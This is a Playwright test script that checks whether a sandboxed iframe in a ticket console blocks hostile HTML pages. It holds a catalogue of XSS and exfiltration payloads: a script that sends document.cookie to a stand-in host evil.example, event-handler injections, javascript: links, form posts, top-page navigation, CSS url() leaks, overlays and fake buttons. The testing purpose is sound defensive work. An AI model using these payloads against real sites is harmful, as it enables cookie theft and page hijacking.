// scripts/rich-ticket-proof.mjs — the browser proof of the wall around a ticket's rich part
// (src/lib/richTicket.ts, src/components/QueueRich.tsx). It puts hostile pages INTO the frame of a
// real Queue, past the server's check (the answer of GET /api/queue/:id/page is replaced in the
// browser), and shows that each one does nothing: no outside request or connection, no message to
// the Queue, no move of the top page, no popup, no change of the Queue's own buttons.
// A control run puts the same pages in a plain frame with no sandbox and no policy, and must see
// the attacks work: it proves that this script can see a hit.
//
// Run it against an isolated instance (scripts/chief-instance.sh), never the live console:
//   B=http://127.0.0.1:<port> TOKEN=<a paired user token> TICKET="<title of an open choice ticket with a page>" \
//   PLAYWRIGHT=<…/playwright-core/index.mjs> CHROME=<chromium binary> node scripts/rich-ticket-proof.mjs [out-dir]
// Exit 0: every attack had no effect and the control saw the hits.
import http from "node:http";
import { mkdirSync, writeFileSync } from "node:fs";
import { join } from "node:path";

const { B, TOKEN, TICKET, PLAYWRIGHT, CHROME } = process.env;
if (!B || !TOKEN || !TICKET || !PLAYWRIGHT || !CHROME) { console.error("set B, TOKEN, TICKET, PLAYWRIGHT and CHROME"); process.exit(2); }
const OUT = process.argv[2] ?? ".";
mkdirSync(OUT, { recursive: true });
const { chromium } = await import(PLAYWRIGHT);

// The "outside": a server on this host that the browser reaches as evil.example. It counts every
// connection (a preconnect has no request) and every request.
const hits = [];
let sockets = 0;
const canary = http.createServer((req, res) => { hits.push(`${req.method} ${req.url}`); res.setHeader("access-control-allow-origin", "*"); res.end("/* canary */"); });
canary.on("connection", () => { sockets++; });
await new Promise((r) => canary.listen(0, "127.0.0.1", r));
const E = `http://evil.example:${canary.address().port}`;

// What a script would do if it ran: mark the page, call the Queue, move the top page, call out.
const JS = `document.title='RAN';try{document.getElementById('m').textContent='RAN'}catch(e){};` +
  `try{parent.postMessage('pwn','*')}catch(e){};try{top.postMessage('pwn','*')}catch(e){};` +
  `try{new Image().src='${E}/js-img?c='+encodeURIComponent(document.cookie)}catch(e){};try{fetch('${E}/js-fetch',{mode:'no-cors'})}catch(e){};` +
  `try{localStorage.setItem('pwn','1')}catch(e){};try{parent.document.title='PWNED'}catch(e){};try{top.location='${E}/js-top'}catch(e){}`;
const PNG = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==";
const BTN = "display:inline-block;padding:8px 14px;border-radius:8px;background:#ededed;color:#0a0a0a;font:500 13px sans-serif;cursor:pointer";

// `press`: ids inside the page that the proof presses, one after the other.
const ATTACKS = [
  { name: "A script (inline and from outside)", html: `<p id="m">start</p><script>${JS}</script><script src="${E}/s.js"></script>` },
  { name: "Reading parent, top, cookies, localStorage", html: `<p id="m">start</p><script>${JS}</script>`, note: "needs a script: none runs; the origin of the frame is opaque" },
  { name: "Event handlers (onerror, onload, ontoggle, onfocus)", html: `<p id="m">start</p><img src="x" onerror="${JS}"><img src="${PNG}" onload="${JS}"><svg onload="${JS}"></svg><details open ontoggle="${JS}"><summary>d</summary></details><input autofocus onfocus="${JS}">` },
  { name: "A javascript: link and a javascript: frame", html: `<p id="m">start</p><a id="a1" href="javascript:${JS}">press</a><iframe src="javascript:parent.postMessage('pwn','*')"></iframe>`, press: ["a1"] },
  { name: "A form post and a form get", html: `<form action="${E}/form-post" method="post"><input name="a" value="b"><button id="f1" style="${BTN}">Merge</button></form><form action="${E}/form-get"><input type="submit" id="f2" value="Send"></form>`, press: ["f1", "f2"] },
  { name: "Navigation of the top page, the parent, a new tab", html: `<a id="t1" href="${E}/top" target="_top">top</a> <a id="t2" href="${E}/parent" target="_parent">parent</a> <a id="t3" href="${E}/blank" target="_blank">new tab</a>`, press: ["t1", "t2", "t3"] },
  { name: "A plain link (the page moves itself)", html: `<a id="l1" href="${E}/self">https://github.com/login</a>`, press: ["l1"] },
  { name: "A meta refresh, a base, a second policy", html: `<meta http-equiv="refresh" content="0;url=${E}/meta-refresh"><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"><base href="${E}/base/"><img src="rel.png"><p>x</p>` },
  { name: "Outside image, media, frame, object, link, preconnect", html: `<img src="${E}/img.png"><img srcset="${E}/srcset.png 2x"><picture><source srcset="${E}/picture.png"><img></picture><video poster="${E}/poster.png" src="${E}/video.mp4" autoplay></video><audio src="${E}/audio.mp3" autoplay></audio><iframe src="${E}/frame"></iframe><object data="${E}/object"></object><embed src="${E}/embed"><link rel="stylesheet" href="${E}/link.css"><link rel="prefetch" href="${E}/prefetch"><link rel="preconnect" href="${E}"><svg><image href="${E}/svg-image.png"></image><use href="${E}/use.svg#a"></use></svg><input type="image" src="${E}/input.png">` },
  { name: "CSS @import and url() to outside", css: `@import url("${E}/import.css");@import "${E}/import2.css";@font-face{font-family:x;src:url(${E}/font.woff2)}body{background:url(${E}/bg.png);font-family:x;cursor:url(${E}/cursor.png),auto}li{list-style-image:url(${E}/li.png)}p::after{content:url(${E}/content.png)}`, html: `<p style="background:url('${E}/attr.png');border-image:url(${E}/border.png)">text</p><ul><li>x</li></ul>` },
  { name: "A fixed overlay over the answer bar", html: `<div style="position:fixed;inset:-5000px;z-index:2147483647;background:#c00;color:#fff;font:700 40px sans-serif;padding:5020px">COVER</div>`, shot: "overlay" },
  { name: "A fake Merge button (a picture of a button)", html: `<p>Looks good.</p><div id="b1" style="${BTN}">Merge</div> <div id="b2" style="${BTN}">A · Accept</div>`, press: ["b1", "b2"], shot: "fake-button" },
];

const browser = await chromium.launch({ executablePath: CHROME, args: ["--no-sandbox", "--host-resolver-rules=MAP evil.example 127.0.0.1"] });
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const page0 = { css: "", html: "" };

async function runQueue(attack) {
  hits.length = 0; sockets = 0;
  const ctx = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  await ctx.addInitScript(([t]) => {
    localStorage.setItem("choibot.userToken", t); localStorage.setItem("choibot-theme", "dark");
    window.__msgs = [];
    window.addEventListener("message", (e) => { window.__msgs.push(String(e.data).slice(0, 40)); });
  }, [TOKEN]);
  // A request the policy stops still shows as a "request" event of the browser, then as a failed
  // one with no connection: those are counted apart (`blocked`). The canary is the truth.
  const requests = [], posts = [], dialogs = [], blocked = new Map();
  ctx.on("request", (r) => { requests.push(r); if (r.method() !== "GET") posts.push(`${r.method()} ${new URL(r.url()).pathname}`); });
  ctx.on("requestfailed", (r) => { blocked.set(r, r.failure()?.errorText ?? "failed"); });
  await ctx.route("**/api/queue/*/page", (route) => route.fulfill({ contentType: "application/json", body: JSON.stringify({ ...page0, ...("css" in attack ? { css: attack.css } : {}), html: attack.html, height: 300 }) }));
  const page = await ctx.newPage();
  page.on("dialog", (d) => { dialogs.push(d.message()); void d.dismiss(); });
  await page.goto(`${B}/`, { waitUntil: "load" });
  await page.getByRole("button", { name: /Queue/ }).first().click(); // the Queue view
  await page.getByText(TICKET, { exact: false }).first().click();
  await page.waitForSelector("[data-queue-rich] iframe");
  const top = page.url();
  // The agent's page: the frame inside the console's outer page.
  let inner;
  for (let i = 0; i < 50 && !inner; i++) { inner = page.frames().find((f) => f.parentFrame()?.parentFrame() === page.mainFrame()); if (!inner) await sleep(100); }
  await sleep(1500);
  const before = posts.length;
  let pressed = 0;
  for (const id of attack.press ?? []) {
    // A press at the element's place, as a user does it (the frame may be gone after a press).
    const box = await inner?.locator(`#${id}`).boundingBox({ timeout: 2000 }).catch(() => null);
    if (box) { await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2); pressed++; }
    await sleep(700);
  }
  await sleep(1200);
  const ui = await page.evaluate(() => {
    const at = (el) => { if (!el) return "missing"; const r = el.getBoundingClientRect(); const hit = document.elementFromPoint(r.left + r.width / 2, r.top + r.height / 2); return hit && el.contains(hit) ? "ok" : `covered by <${hit?.tagName.toLowerCase()}>`; };
    const d = document.querySelector("[data-queue-detail]");
    return { title: at(d?.querySelector("h2")), option: at(d?.querySelector('[role="radio"]')), reply: at(d?.querySelector("[data-queue-reply]")), label: at(document.querySelector("[data-queue-rich] > div")), msgs: window.__msgs.filter((m) => m.includes("pwn")), docTitle: document.title, pwnKey: localStorage.getItem("pwn") };
  });
  const frame = await page.$eval("[data-queue-rich] iframe", (f) => ({ sandbox: f.getAttribute("sandbox"), inFlow: getComputedStyle(f).position === "static" }));
  if (attack.shot) await page.screenshot({ path: join(OUT, `proof-${attack.shot}.png`) });
  const out = requests.filter((q) => !q.url().startsWith(`${B}/`) && !/^(data|about|blob):/.test(q.url()));
  const outside = out.filter((q) => !blocked.has(q)).map((q) => q.url());
  const stopped = out.filter((q) => blocked.has(q)).map((q) => `${new URL(q.url()).pathname} (${blocked.get(q)})`);
  const r = {
    hits: [...hits], sockets, outside, stopped, pressed, msgs: ui.msgs, dialogs, popups: ctx.pages().length - 1, topMoved: page.url() !== top, docTitle: ui.docTitle, pwnKey: ui.pwnKey,
    acted: posts.slice(before), cover: [ui.title, ui.option, ui.reply, ui.label].filter((x) => x !== "ok"), sandbox: frame.sandbox, inFlow: frame.inFlow,
    innerUrl: inner && !inner.isDetached() ? inner.url() : "gone",
  };
  r.clean = r.hits.length === 0 && r.sockets === 0 && r.outside.length === 0 && r.msgs.length === 0 && r.dialogs.length === 0 && r.popups === 0 && !r.topMoved
    && r.docTitle !== "PWNED" && r.pwnKey === null && r.acted.length === 0 && r.cover.length === 0 && r.sandbox === "" && r.inFlow
    // A press the proof could not make proves nothing (the first press may remove the page: one is enough then).
    && (!attack.press || pressed === attack.press.length || (pressed > 0 && r.innerUrl !== "about:srcdoc"));
  await ctx.close();
  return r;
}

// The control: the same page in a plain frame, no sandbox and no policy. An attack that needs no
// press must show at least one hit here.
async function runControl(attack) {
  hits.length = 0; sockets = 0;
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  await page.goto(`${B}/api/queue/none`, { waitUntil: "load" }).catch(() => {}); // any page of the console's origin
  await page.evaluate(([css, html]) => {
    window.__msgs = [];
    window.addEventListener("message", (e) => { window.__msgs.push(String(e.data)); });
    const f = document.createElement("iframe");
    f.srcdoc = `<!doctype html><html><head><style>${css}</style></head><body>${html}</body></html>`;
    document.body.replaceChildren(f);
  }, [attack.css ?? "", attack.html]);
  await sleep(2500);
  const msgs = await page.evaluate(() => window.__msgs?.length ?? 0).catch(() => 1); // a moved top page counts as a hit
  const moved = !page.url().startsWith(B);
  await ctx.close();
  return { hits: hits.length, sockets, msgs, moved, seen: hits.length > 0 || sockets > 0 || msgs > 0 || moved };
}

const rows = [];
let failed = false;
for (const a of ATTACKS) {
  const r = await runQueue(a);
  const c = a.press || a.shot ? null : await runControl(a);
  if (!r.clean || (c && !c.seen)) failed = true;
  rows.push({ name: a.name, ...r, control: c });
  const ctl = c ? (c.seen ? `works with no wall (${c.hits} requests, ${c.msgs} messages${c.moved ? ", top page moved" : ""})` : "CONTROL SAW NOTHING") : "—";
  console.log(`${r.clean ? "PASS" : "FAIL"} | ${a.name} | outside requests ${r.hits.length + r.outside.length}, connections ${r.sockets}, stopped by the policy ${r.stopped.length}, presses ${r.pressed}, messages ${r.msgs.length}, popups ${r.popups}, top moved ${r.topMoved}, actions ${r.acted.length}, covered ${r.cover.length} | control: ${ctl}`);
  if (!r.clean) console.log(JSON.stringify(r, null, 1));
}
writeFileSync(join(OUT, "proof.json"), JSON.stringify(rows, null, 1));
await browser.close();
canary.close();
console.log(failed ? "FAILED" : `OK: ${rows.length} attacks, none had an effect`);
process.exit(failed ? 1 : 0);
